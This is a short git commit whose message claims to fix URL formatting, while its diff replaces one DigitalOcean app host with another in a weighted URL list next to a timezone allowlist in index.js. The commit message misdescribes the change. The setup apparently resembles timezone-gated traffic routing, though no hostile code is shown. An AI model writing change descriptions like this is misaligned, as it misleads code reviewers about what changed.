ebb08df0ea29fec2c7fe62c861e1afbaf3d11ade
paalakash <palaksh452@gmail.com>
2026-07-01 10:47:06 +0530

    Fix URL formatting in RAW_CONFIGS

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://jellyfish-app-xhgxo.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://ranger-app-yed74.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
